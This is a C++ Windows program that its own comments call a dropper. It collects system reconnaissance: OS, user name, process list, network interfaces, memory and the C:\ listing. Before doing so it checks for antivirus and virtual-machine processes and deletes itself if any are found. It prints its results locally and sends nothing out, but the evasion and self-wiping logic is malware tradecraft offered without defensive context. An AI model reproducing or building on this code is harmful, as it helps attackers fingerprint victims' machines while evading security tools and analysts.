#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <sstream>
#include <memory>
#include <filesystem>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

void printInfo(const std::string& message) {
    std::cout << message << std::endl;
}

std::string getSystemInfo() {
    std::stringstream ss;
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (GetVersionEx((LPOSVERSIONINFO)&osvi)) {
        ss << "OS Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion
           << " Build " << osvi.dwBuildNumber << std::endl;
        ss << "Platform ID: " << osvi.dwPlatformId << std::endl;
        ss << "Service Pack: " << osvi.szCSDVersion << std::endl;
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    ss << "Processor Architecture: " << (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") << std::endl;
    ss << "Number of Processors: " << si.dwNumberOfProcessors << std::endl;

    return ss.str();
}

std::string getUsername() {
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        return std::string("User: ") + username;
    } else {
        return "Username not found";
    }
}

std::string getRunningProcesses() {
    std::stringstream ss;
    PROCESSENTRY32 pe32;
    ZeroMemory(&pe32, sizeof(PROCESSENTRY32));

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return "Failed to take snapshot of processes";
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            ss << "Process: " << pe32.szExeFile << " PID: " << pe32.th32ProcessID << std::endl;
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return ss.str();
}

std::string getNetworkInfo() {
    std::stringstream ss;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    // MIB_IFTABLE to store interface info
    MIB_IFTABLE* pIfTable;
    pIfTable = (MIB_IFTABLE*)malloc(sizeof(MIB_IFTABLE));

    if (GetIfTable(pIfTable, &dwSize, TRUE) == ERROR_INSUFFICIENT_BUFFER) {
        pIfTable = (MIB_IFTABLE*)realloc(pIfTable, dwSize);
    }

    dwRetVal = GetIfTable(pIfTable, &dwSize, TRUE);
    if (dwRetVal == NO_ERROR) {
        for (DWORD i = 0; i < pIfTable->dwNumEntries; i++) {
            ss << "Interface Index: " << pIfTable->table[i].dwIndex << ", "
               << "Name: " << pIfTable->table[i].bDescr << ", "
               << "Type: " << pIfTable->table[i].dwType << std::endl;
        }
    }
    free(pIfTable);
    return ss.str();
}

std::string getMemoryInfo() {
    std::stringstream ss;
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (GlobalMemoryStatusEx(&statex)) {
        ss << "Memory in use: " << statex.dwMemoryLoad << "%" << std::endl;
        ss << "Total Physical Memory: " << statex.ullTotalPhys / (1024 * 1024) << " MB" << std::endl;
        ss << "Available Physical Memory: " << statex.ullAvailPhys / (1024 * 1024) << " MB" << std::endl;
    }
    return ss.str();
}

std::string getDriveInfo() {
    std::stringstream ss;
    for (const auto& entry : std::filesystem::directory_iterator("C:\\")) {
        ss << "Drive: " << entry.path().string() << std::endl;
    }
    return ss.str();
}

std::string getCpuInfo() {
    std::stringstream ss;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    ss << "Number of CPU Cores: " << sysInfo.dwNumberOfProcessors << std::endl;
    return ss.str();
}

bool detectDanger() {
    // Simple detection for antivirus or sandbox
    std::vector<std::string> dangerousProcesses = {
        "avp.exe", "mbam.exe", "virusscan.exe", // Example AV processes
        "vmware.exe", "vboxsvc.exe", "hyperv.exe" // Example VM processes
    };

    PROCESSENTRY32 pe32;
    ZeroMemory(&pe32, sizeof(PROCESSENTRY32));

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;  // Assume safe if we can't access processes
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    bool dangerFound = false;
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            for (const auto& proc : dangerousProcesses) {
                if (strstr(pe32.szExeFile, proc.c_str()) != nullptr) {
                    dangerFound = true;
                    break;
                }
            }
            if (dangerFound) break;
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);

    return dangerFound;
}

void wipeSelf() {
    // Deletes the dropper itself
    char szFile[MAX_PATH];
    GetModuleFileNameA(NULL, szFile, MAX_PATH);
    DeleteFileA(szFile);
}

void performRecon() {
    // First, check if there is any danger (AV, VM, sandbox)
    if (detectDanger()) {
        // If danger detected, wipe self and exit
        wipeSelf();
        return;
    }

    // If no danger, proceed with reconnaissance
    printInfo(getSystemInfo());
    printInfo(getUsername());
    printInfo(getRunningProcesses());
    printInfo(getNetworkInfo());
    printInfo(getMemoryInfo());
    printInfo(getDriveInfo());
    printInfo(getCpuInfo());
}

int main() {
    try {
        performRecon();
    } catch (const std::exception& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
        return 1;
    }
    return 0;
}
